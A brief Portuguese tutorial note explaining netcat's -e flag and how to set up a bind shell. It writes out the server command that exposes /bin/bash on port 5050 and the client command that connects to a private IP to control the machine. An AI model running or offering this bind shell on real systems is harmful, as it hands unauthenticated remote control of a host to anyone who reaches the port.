Utilizando o atributo -e

-e serve para executar um programa 

comando: nc -vnlp 5050 -e /bin/bash

Nesse caso o netcat abre uma porta 5050 e da acesso ao terminal do linux.

Quem acessar esse ip/porta vai conseguir controlar o linux


No caso do bind shell é executado esse comando no lado do servidor.

E no lado do cliente, executa esse:
nc -vn 192.168.15.125 5050